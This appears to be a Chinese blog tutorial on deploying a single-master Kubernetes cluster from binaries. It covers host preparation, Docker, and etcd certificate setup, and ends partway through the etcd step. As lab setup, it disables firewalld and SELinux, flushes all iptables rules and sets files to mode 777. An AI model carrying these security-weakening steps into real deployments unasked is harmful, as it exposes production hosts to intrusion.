<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【K8S 二进制部署】部署单Master Kurbernetes集群 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【K8S 二进制部署】部署单Master Kurbernetes集群" />
<meta property="og:description" content="目录
一、基本架构和系统初始化
1、集群架构：
2、操作系统初始化配置：
2.1、关闭防火墙和安全机制：
2.2、关闭swap
2.3、根据规划设置主机名
2.4、三台主机全部互相映射
2.5、调整内核参数
3、时间同步（所有节点时间必须同步）
二、部署 docker引擎
三、部署 etcd 集群
1、准备签发证书环境
2、生成Etcd证书
3、证书复制到node节点
4、启动etcd服务
5、检查etcd群集状态
四、部署 Master 组件
1、二进制文件、token、证书
2、开启 apiserver 服务
3、启动 scheduler 服务
4、启动 controller-manager 服务
5、生成kubectl连接集群的kubeconfig文件
6、通过kubectl工具查看当前集群组件状态
五、部署 Worker Node 组件
1、部署kubelet和proxy
一、基本架构和系统初始化 二进制部署：源码包部署
1、集群架构： K8S master01：20.0.0.61 kube-apiserver、kube-controller-manager、kube-scheduler、etcd K8S master02：20.0.0.62 kube-apiserver、kube-controller-manager、kube-scheduler node01：20.0.0.63 kubelet、kube-proxy、etcd node02：20.0.0.64 kubelet、kube-proxy、etcd 负载均衡：nginx&#43;keepalived：master：20.0.0.65 backup：20.0.0.66 etcd集群： master01 20.0.0.61 node1 20.0.0.63 node2 20.0.0.64 2、操作系统初始化配置： 2.1、关闭防火墙和安全机制： systemctl stop firewalld setenforce 0 iptables -F &amp;&amp; iptables -t nat -F &amp;&amp; iptables -t mangle -F &amp;&amp; iptables -X iptables -F：清除默认的 iptables 规则链（如 INPUT、FORWARD、OUTPUT）中的所有规则。 iptables -t nat -F：清除 &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/0e2a957225fb3bcdeaac845ad8ec12c3/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-27T21:23:59+08:00" />
<meta property="article:modified_time" content="2023-12-27T21:23:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【K8S 二进制部署】部署单Master Kurbernetes集群</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:0px;"></p> 
<p id="%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%88%9D%E5%A7%8B%E5%8C%96-toc" style="margin-left:40px;"><a href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%88%9D%E5%A7%8B%E5%8C%96" rel="nofollow">一、基本架构和系统初始化</a></p> 
<p id="1%E3%80%81%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84%EF%BC%9A-toc" style="margin-left:80px;"><a href="#1%E3%80%81%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84%EF%BC%9A" rel="nofollow">1、集群架构：</a></p> 
<p id="2%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%EF%BC%9A-toc" style="margin-left:80px;"><a href="#2%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%EF%BC%9A" rel="nofollow">2、操作系统初始化配置：</a></p> 
<p id="2.1%E3%80%81%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E5%92%8C%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%9A-toc" style="margin-left:120px;"><a href="#2.1%E3%80%81%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E5%92%8C%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%9A" rel="nofollow">2.1、关闭防火墙和安全机制：</a></p> 
<p id="2.2%E3%80%81%E5%85%B3%E9%97%ADswap-toc" style="margin-left:120px;"><a href="#2.2%E3%80%81%E5%85%B3%E9%97%ADswap" rel="nofollow">2.2、关闭swap</a></p> 
<p id="2.3%E3%80%81%E6%A0%B9%E6%8D%AE%E8%A7%84%E5%88%92%E8%AE%BE%E7%BD%AE%E4%B8%BB%E6%9C%BA%E5%90%8D-toc" style="margin-left:120px;"><a href="#2.3%E3%80%81%E6%A0%B9%E6%8D%AE%E8%A7%84%E5%88%92%E8%AE%BE%E7%BD%AE%E4%B8%BB%E6%9C%BA%E5%90%8D" rel="nofollow">2.3、根据规划设置主机名</a></p> 
<p id="2.4%E3%80%81%E4%B8%89%E5%8F%B0%E4%B8%BB%E6%9C%BA%E5%85%A8%E9%83%A8%E4%BA%92%E7%9B%B8%E6%98%A0%E5%B0%84-toc" style="margin-left:120px;"><a href="#2.4%E3%80%81%E4%B8%89%E5%8F%B0%E4%B8%BB%E6%9C%BA%E5%85%A8%E9%83%A8%E4%BA%92%E7%9B%B8%E6%98%A0%E5%B0%84" rel="nofollow">2.4、三台主机全部互相映射</a></p> 
<p id="2.5%E3%80%81%E8%B0%83%E6%95%B4%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0-toc" style="margin-left:120px;"><a href="#2.5%E3%80%81%E8%B0%83%E6%95%B4%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0" rel="nofollow">2.5、调整内核参数</a></p> 
<p id="3%E3%80%81%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%EF%BC%88%E6%89%80%E6%9C%89%E8%8A%82%E7%82%B9%E6%97%B6%E9%97%B4%E5%BF%85%E9%A1%BB%E5%90%8C%E6%AD%A5%EF%BC%89-toc" style="margin-left:80px;"><a href="#3%E3%80%81%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%EF%BC%88%E6%89%80%E6%9C%89%E8%8A%82%E7%82%B9%E6%97%B6%E9%97%B4%E5%BF%85%E9%A1%BB%E5%90%8C%E6%AD%A5%EF%BC%89" rel="nofollow">3、时间同步（所有节点时间必须同步）</a></p> 
<p id="%E4%BA%8C%E3%80%81%E9%83%A8%E7%BD%B2%20docker%E5%BC%95%E6%93%8E-toc" style="margin-left:40px;"><a href="#%E4%BA%8C%E3%80%81%E9%83%A8%E7%BD%B2%20docker%E5%BC%95%E6%93%8E" rel="nofollow">二、部署 docker引擎</a></p> 
<p id="%E4%B8%89%E3%80%81%E9%83%A8%E7%BD%B2%20etcd%20%E9%9B%86%E7%BE%A4-toc" style="margin-left:40px;"><a href="#%E4%B8%89%E3%80%81%E9%83%A8%E7%BD%B2%20etcd%20%E9%9B%86%E7%BE%A4" rel="nofollow">三、部署 etcd 集群</a></p> 
<p id="1%E3%80%81%E5%87%86%E5%A4%87%E7%AD%BE%E5%8F%91%E8%AF%81%E4%B9%A6%E7%8E%AF%E5%A2%83-toc" style="margin-left:80px;"><a href="#1%E3%80%81%E5%87%86%E5%A4%87%E7%AD%BE%E5%8F%91%E8%AF%81%E4%B9%A6%E7%8E%AF%E5%A2%83" rel="nofollow">1、准备签发证书环境</a></p> 
<p id="2%E3%80%81%E7%94%9F%E6%88%90Etcd%E8%AF%81%E4%B9%A6-toc" style="margin-left:80px;"><a href="#2%E3%80%81%E7%94%9F%E6%88%90Etcd%E8%AF%81%E4%B9%A6" rel="nofollow">2、生成Etcd证书</a></p> 
<p id="3%E3%80%81%E8%AF%81%E4%B9%A6%E5%A4%8D%E5%88%B6%E5%88%B0node%E8%8A%82%E7%82%B9-toc" style="margin-left:80px;"><a href="#3%E3%80%81%E8%AF%81%E4%B9%A6%E5%A4%8D%E5%88%B6%E5%88%B0node%E8%8A%82%E7%82%B9" rel="nofollow">3、证书复制到node节点</a></p> 
<p id="4%E3%80%81%E5%90%AF%E5%8A%A8etcd%E6%9C%8D%E5%8A%A1-toc" style="margin-left:80px;"><a href="#4%E3%80%81%E5%90%AF%E5%8A%A8etcd%E6%9C%8D%E5%8A%A1" rel="nofollow">4、启动etcd服务</a></p> 
<p id="5%E3%80%81%E6%A3%80%E6%9F%A5etcd%E7%BE%A4%E9%9B%86%E7%8A%B6%E6%80%81-toc" style="margin-left:80px;"><a href="#5%E3%80%81%E6%A3%80%E6%9F%A5etcd%E7%BE%A4%E9%9B%86%E7%8A%B6%E6%80%81" rel="nofollow">5、检查etcd群集状态</a></p> 
<p id="%E5%9B%9B%E3%80%81%E9%83%A8%E7%BD%B2%20Master%20%E7%BB%84%E4%BB%B6-toc" style="margin-left:40px;"><a href="#%E5%9B%9B%E3%80%81%E9%83%A8%E7%BD%B2%20Master%20%E7%BB%84%E4%BB%B6" rel="nofollow">四、部署 Master 组件</a></p> 
<p id="1%E3%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E3%80%81token%E3%80%81%E8%AF%81%E4%B9%A6-toc" style="margin-left:80px;"><a href="#1%E3%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E3%80%81token%E3%80%81%E8%AF%81%E4%B9%A6" rel="nofollow">1、二进制文件、token、证书</a></p> 
<p id="2%E3%80%81%E5%BC%80%E5%90%AF%20apiserver%20%E6%9C%8D%E5%8A%A1-toc" style="margin-left:80px;"><a href="#2%E3%80%81%E5%BC%80%E5%90%AF%20apiserver%20%E6%9C%8D%E5%8A%A1" rel="nofollow">2、开启 apiserver 服务</a></p> 
<p id="3%E3%80%81%E5%90%AF%E5%8A%A8%20scheduler%20%E6%9C%8D%E5%8A%A1-toc" style="margin-left:80px;"><a href="#3%E3%80%81%E5%90%AF%E5%8A%A8%20scheduler%20%E6%9C%8D%E5%8A%A1" rel="nofollow">3、启动 scheduler 服务</a></p> 
<p id="4%E3%80%81%E5%90%AF%E5%8A%A8%20controller-manager%20%E6%9C%8D%E5%8A%A1-toc" style="margin-left:80px;"><a href="#4%E3%80%81%E5%90%AF%E5%8A%A8%20controller-manager%20%E6%9C%8D%E5%8A%A1" rel="nofollow">4、启动 controller-manager 服务</a></p> 
<p id="5%E3%80%81%E7%94%9F%E6%88%90kubectl%E8%BF%9E%E6%8E%A5%E9%9B%86%E7%BE%A4%E7%9A%84kubeconfig%E6%96%87%E4%BB%B6-toc" style="margin-left:80px;"><a href="#5%E3%80%81%E7%94%9F%E6%88%90kubectl%E8%BF%9E%E6%8E%A5%E9%9B%86%E7%BE%A4%E7%9A%84kubeconfig%E6%96%87%E4%BB%B6" rel="nofollow">5、生成kubectl连接集群的kubeconfig文件</a></p> 
<p id="6%E3%80%81%E9%80%9A%E8%BF%87kubectl%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E9%9B%86%E7%BE%A4%E7%BB%84%E4%BB%B6%E7%8A%B6%E6%80%81-toc" style="margin-left:80px;"><a href="#6%E3%80%81%E9%80%9A%E8%BF%87kubectl%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E9%9B%86%E7%BE%A4%E7%BB%84%E4%BB%B6%E7%8A%B6%E6%80%81" rel="nofollow">6、通过kubectl工具查看当前集群组件状态</a></p> 
<p id="%E4%BA%94%E3%80%81%E9%83%A8%E7%BD%B2%20Worker%20Node%20%E7%BB%84%E4%BB%B6-toc" style="margin-left:40px;"><a href="#%E4%BA%94%E3%80%81%E9%83%A8%E7%BD%B2%20Worker%20Node%20%E7%BB%84%E4%BB%B6" rel="nofollow">五、部署 Worker Node 组件</a></p> 
<p id="1%E3%80%81%E9%83%A8%E7%BD%B2kubelet%E5%92%8Cproxy-toc" style="margin-left:80px;"><a href="#1%E3%80%81%E9%83%A8%E7%BD%B2kubelet%E5%92%8Cproxy" rel="nofollow">1、部署kubelet和proxy</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h3 id="%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%88%9D%E5%A7%8B%E5%8C%96">一、基本架构和系统初始化</h3> 
<p style="margin-left:.0001pt;text-align:justify;">二进制部署：源码包部署</p> 
<h4 id="1%E3%80%81%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84%EF%BC%9A" style="margin-left:.0001pt;text-align:justify;"><strong><strong>1、集群架构：</strong></strong></h4> 
<pre><code>K8S master01：20.0.0.61 kube-apiserver、kube-controller-manager、kube-scheduler、etcd
K8S master02：20.0.0.62 kube-apiserver、kube-controller-manager、kube-scheduler

node01：20.0.0.63 kubelet、kube-proxy、etcd
node02：20.0.0.64 kubelet、kube-proxy、etcd

负载均衡：nginx+keepalived：master：20.0.0.65
backup：20.0.0.66

etcd集群：
master01 20.0.0.61
node1 20.0.0.63
node2 20.0.0.64</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="2%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%EF%BC%9A" style="text-align:justify;"><strong>2、操作系统初始化配置</strong><strong>：</strong></h4> 
<h5 id="2.1%E3%80%81%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E5%92%8C%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%EF%BC%9A" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2.1、关闭防火墙</strong></strong><strong><strong>和安全机制：</strong></strong></h5> 
<pre><code>systemctl stop firewalld
setenforce 0
iptables -F &amp;&amp; iptables -t nat -F &amp;&amp; iptables -t mangle -F &amp;&amp; iptables -X


iptables -F：清除默认的 iptables 规则链（如 INPUT、FORWARD、OUTPUT）中的所有规则。

iptables -t nat -F：清除 "nat" 表中的所有规则，这通常包含用于网络地址转换（NAT）的规则。

iptables -t mangle -F：清除 "mangle" 表中的所有规则，这通常包含用于修改数据包头部的规则。

iptables -X：删除用户自定义的链。它将删除你可能在 iptables 中创建的任何自定义链。</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h5 id="2.2%E3%80%81%E5%85%B3%E9%97%ADswap" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2.2、关闭swap</strong></strong></h5> 
<p style="margin-left:.0001pt;text-align:justify;">关闭交换分区，提升性能</p> 
<p style="margin-left:.0001pt;text-align:justify;">swap交换分区，如果机器内存不够，就会使用swap交换分区，但是swap交换分区的性能较低，</p> 
<p style="margin-left:.0001pt;text-align:justify;">k8s设计的时候为了提升性能，默认是不允许使用交换分区的。kubeadm初始化的时候会检测swap是否关闭，</p> 
<p style="margin-left:.0001pt;text-align:justify;">如果没关闭就会初始化失败。如果不想关闭交换分区，</p> 
<p style="margin-left:.0001pt;text-align:justify;">安装k8s的时候可以指定-ignore-preflight-errors=Swap来解决。</p> 
<pre><code>swapoff -a

sed -ri 's/.*swap.*/#&amp;/' /etc/fstab</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h5 id="2.3%E3%80%81%E6%A0%B9%E6%8D%AE%E8%A7%84%E5%88%92%E8%AE%BE%E7%BD%AE%E4%B8%BB%E6%9C%BA%E5%90%8D" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2.3、根据规划设置主机名</strong></strong></h5> 
<pre><code>hostnamectl set-hostname master01
hostnamectl set-hostname node01
hostnamectl set-hostname node02</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h5 id="2.4%E3%80%81%E4%B8%89%E5%8F%B0%E4%B8%BB%E6%9C%BA%E5%85%A8%E9%83%A8%E4%BA%92%E7%9B%B8%E6%98%A0%E5%B0%84" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2.4、三台主机全部互相映射</strong></strong></h5> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<pre><code>vim /etc/hosts

20.0.0.61 master01
20.0.0.63 node01
20.0.0.64 node02</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="145" src="https://images2.imgbox.com/21/40/NtJHHLGZ_o.png" width="693"></p> 
<h5 id="2.5%E3%80%81%E8%B0%83%E6%95%B4%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2.5、调整内核参数</strong></strong></h5> 
<pre><code>vim /etc/sysctl.d/k8s.conf
#开启网桥模式
net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
#网桥的流量传给iptables的链，实现地址映射

#关闭ipv6的流量（可选项，看情况）
net.ipv6.conf.all.disable_ipv6=1
#根据工作中的实际情况，自定

net.ipv4.ip_forward=1
#开启转发功能


#加载配置：
sysctl --system</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="280" src="https://images2.imgbox.com/fa/54/Wf7fUSNx_o.png" width="562"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="3%E3%80%81%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%EF%BC%88%E6%89%80%E6%9C%89%E8%8A%82%E7%82%B9%E6%97%B6%E9%97%B4%E5%BF%85%E9%A1%BB%E5%90%8C%E6%AD%A5%EF%BC%89" style="margin-left:.0001pt;text-align:justify;"><strong><strong>3、时间同步（所有节点时间必须同步</strong></strong>）</h4> 
<pre><code>yum install ntpdate -y
ntpdate ntp.aliyun.com</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h3 id="%E4%BA%8C%E3%80%81%E9%83%A8%E7%BD%B2%20docker%E5%BC%95%E6%93%8E" style="margin-left:.0001pt;text-align:justify;"><strong><strong>二、部署 docker引擎</strong></strong></h3> 
<p style="margin-left:.0001pt;text-align:justify;">所有 node 节点部署docker引擎</p> 
<pre><code>yum install -y yum-utils device-mapper-persistent-data lvm2

yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

yum install -y docker-ce docker-ce-cli containerd.io



systemctl start docker.service
systemctl enable docker.service</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h3 id="%E4%B8%89%E3%80%81%E9%83%A8%E7%BD%B2%20etcd%20%E9%9B%86%E7%BE%A4" style="margin-left:.0001pt;text-align:justify;"><strong><strong>三、部署 etcd 集群</strong></strong></h3> 
<p style="margin-left:.0001pt;text-align:justify;">etcd是一个高可用-分布式键值存储数据库</p> 
<p style="margin-left:.0001pt;text-align:justify;">采用raft算法保证节点的信息一致性。</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd是基于go语言写的</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd端口：</p> 
<p style="margin-left:.0001pt;text-align:justify;">2379：API接口，对外为客户端提供通信</p> 
<p style="margin-left:.0001pt;text-align:justify;">2380：内部服务的通信端口</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd 在生产环境中一般推荐集群方式部署。由于etcd 的leader选举机制，要求至少为3台或以上的奇数台。</p> 
<p style="margin-left:.0001pt;text-align:justify;">K8S内部通信依靠证书认证（秘钥认证）</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="1%E3%80%81%E5%87%86%E5%A4%87%E7%AD%BE%E5%8F%91%E8%AF%81%E4%B9%A6%E7%8E%AF%E5%A2%83" style="margin-left:.0001pt;text-align:justify;"><strong><strong>1、准备签发证书环境</strong></strong></h4> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>相关证书：</strong></p> 
<pre><code>cfssl：证书签发的工具命令
cfssljson：将 cfssl 生成的证书（json格式）变为文件承载式证书
cfssl-certinfo：验证证书的信息


#查看证书的信息
cfssl-certinfo -cert &lt;证书名称&gt;</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>在 master01 节点上操作</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">将三个证书文件，放到/opt下</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="124" src="https://images2.imgbox.com/1c/13/MSRXWajw_o.png" width="475"></p> 
<pre><code>mv cfssl cfssl-certinfo cfssljson /usr/local/bin/
chmod 777 /usr/local/bin/cfssl*</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="121" src="https://images2.imgbox.com/3d/41/Jgc2DKSC_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<h4 id="2%E3%80%81%E7%94%9F%E6%88%90Etcd%E8%AF%81%E4%B9%A6" style="margin-left:.0001pt;text-align:justify;"><strong><strong>2、生成Etcd证书</strong></strong></h4> 
<pre><code>mkdir /opt/k8s

cd /opt/k8s/</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong>上传 etcd-cert.sh 和 etcd.sh 到 /opt/k8s/ 目录中</strong></p> 
<pre><code>chmod 777 etcd-cert.sh etcd.sh</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="137" src="https://images2.imgbox.com/21/d2/04FYkuxR_o.png" width="578"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>脚本详解：</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd配置文件创建:</p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>etcd.sh：</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">在 /opt/etcd/cfg/etcd 路径下创建了一个配置文件，用于定义 etcd 节点的各种参数，</p> 
<p style="margin-left:.0001pt;text-align:justify;">包括节点名称、数据目录、监听地址等。这个配置文件描述了etcd节点在集群中的角色和通信方式。</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd服务管理文件创建:</p> 
<p style="margin-left:.0001pt;text-align:justify;">在 /usr/lib/systemd/system/etcd.service 路径下创建了一个 systemd 服务管理文件。</p> 
<p style="margin-left:.0001pt;text-align:justify;">这个文件定义了 etcd 服务的启动方式、环境变量以及其他配置，例如 TLS 证书的路径。</p> 
<p style="margin-left:.0001pt;text-align:justify;">启动etcd服务:</p> 
<p style="margin-left:.0001pt;text-align:justify;">使用 systemd 启动了 etcd 服务。systemd 是 Linux 系统的一个服务管理工具，它能够启动、停止和管理后台服务。</p> 
<p style="margin-left:.0001pt;text-align:justify;">TLS证书配置:</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd服务配置中包含了一些关于 TLS（传输层安全）证书的设置。</p> 
<p style="margin-left:.0001pt;text-align:justify;">TLS用于在网络上安全地传输数据，这里的证书用于对集群内和客户端之间的通信进行加密和身份验证。</p> 
<p style="margin-left:.0001pt;text-align:justify;">Flannel兼容性:</p> 
<p style="margin-left:.0001pt;text-align:justify;">有一个注释指出当前版本的 flannel（一种网络解决方案）不支持 etcd v3 通信。</p> 
<p style="margin-left:.0001pt;text-align:justify;">这表明该脚本可能用于配置 etcd v2 接口以便与 flannel 兼容。</p> 
<p style="margin-left:.0001pt;text-align:justify;">总的来说，这个脚本用于设置一个安全的、分布式的 etcd 集群节点，</p> 
<p style="margin-left:.0001pt;text-align:justify;">以便在集群中存储和管理键值对数据，通常用于分布式系统的配置和协调。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>etcd-cert.sh：</strong></strong><strong><strong>（</strong></strong><strong><span style="color:#0000ff;"><strong>要进去改一下IP地址</strong></span></strong><strong><strong>）</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">CA配置文件 (ca-config.json):</p> 
<p style="margin-left:.0001pt;text-align:justify;">配置了证书生成策略，定义了默认过期时间和一个名为 "www" 的配置模板，</p> 
<p style="margin-left:.0001pt;text-align:justify;">该模板具有较长的过期时间和用途包括签名、密钥加密、服务器认证和客户端认证。</p> 
<p style="margin-left:.0001pt;text-align:justify;">CA签名请求文件 (ca-csr.json):</p> 
<p style="margin-left:.0001pt;text-align:justify;">用于生成根证书和私钥的签名请求文件。包括了Common Name（CN），密钥算法和一些组织信息。</p> 
<p style="margin-left:.0001pt;text-align:justify;">生成根证书和私钥:</p> 
<p style="margin-left:.0001pt;text-align:justify;">使用 cfssl 工具根据配置文件生成根证书 (ca.pem) 和私钥 (ca-key.pem)，同时生成签名请求文件 (ca.csr)。</p> 
<p style="margin-left:.0001pt;text-align:justify;">服务器证书签名请求文件 (server-csr.json):</p> 
<p style="margin-left:.0001pt;text-align:justify;">用于生成 etcd 服务器证书和私钥的签名请求文件。包括了Common Name（CN），主机地址列表，密钥算法和一些组织信息。</p> 
<p style="margin-left:.0001pt;text-align:justify;">生成etcd服务器证书和私钥:</p> 
<p style="margin-left:.0001pt;text-align:justify;">使用 cfssl 工具根据根证书对服务器签名请求文件进行签名，生成 etcd 服务器证书 (server.pem) 和私钥 (server-key.pem)。</p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="352" src="https://images2.imgbox.com/38/ba/l0Son6Te_o.png" width="507"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>创建用于生成CA证书、etcd 服务器证书以及私钥的目录</strong></strong></p> 
<pre><code>mkdir /opt/k8s/etcd-cert
mv etcd-cert.sh etcd-cert/
cd /opt/k8s/etcd-cert/

./etcd-cert.sh
#生成CA证书、etcd 服务器证书以及私钥</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="291" src="https://images2.imgbox.com/66/77/BnaHOW7R_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="88" src="https://images2.imgbox.com/3f/3e/zDddT0X4_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>秘钥、证书：</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">ca-config.json：证书颁发机构（CA）的配置文件，定义了证书生成策略，包括默认过期时间和用途模板。</p> 
<p style="margin-left:.0001pt;text-align:justify;">ca-csr.json：用于生成根证书和私钥的签名请求文件。包括Common Name（CN）和一些组织信息。</p> 
<p style="margin-left:.0001pt;text-align:justify;">ca.pem：根证书文件，用于签发其他组件的证书。</p> 
<p style="margin-left:.0001pt;text-align:justify;">ca.csr：根证书签发请求文件。</p> 
<p style="margin-left:.0001pt;text-align:justify;">ca-key.pem：根证书私钥文件。</p> 
<p style="margin-left:.0001pt;text-align:justify;">server-csr.json：用于生成 etcd 服务器证书和私钥的签名请求文件。包括Common Name（CN）、主机地址列表和一些组织信息。</p> 
<p style="margin-left:.0001pt;text-align:justify;">server.pem：etcd 服务器证书文件，用于加密和认证 etcd 节点之间的通信。</p> 
<p style="margin-left:.0001pt;text-align:justify;">server.csr：etcd 服务器证书签发请求文件。</p> 
<p style="margin-left:.0001pt;text-align:justify;">server-key.pem：etcd 服务器证书私钥文件。</p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>上传 etcd-v3.4.9-linux-amd64.tar.gz 到 /opt/k8s 目录中，启动etcd服务</strong></strong></p> 
<pre><code>cd /opt/k8s/

tar zxvf etcd-v3.4.9-linux-amd64.tar.gz

ls etcd-v3.4.9-linux-amd64</code></pre> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><img alt="" height="61" src="https://images2.imgbox.com/de/3f/0BjYJpJm_o.png" width="692"></p> 
<p style="margin-left:.0001pt;text-align:justify;"></p> 
<p style="margin-left:.0001pt;text-align:justify;"><strong><strong>文件详解：</strong></strong></p> 
<p style="margin-left:.0001pt;text-align:justify;">Documentation（文档）:</p> 
<p style="margin-left:.0001pt;text-align:justify;">包含文档文件的目录。你可以参考这些文件以获取有关如何使用和配置etcd的信息。</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd:</p> 
<p style="margin-left:.0001pt;text-align:justify;">主要的etcd二进制文件。这是etcd服务器的可执行文件，它是一个分布式键值存储。</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcdctl:</p> 
<p style="margin-left:.0001pt;text-align:justify;">etcd命令行实用程序。这是与etcd集群进行交互的客户端。你可以使用此实用程序在etcd存储中获取、设置和管理键。</p> 
<p style="margin-left:.0001pt;text-align:justify;">README文件:</p> 
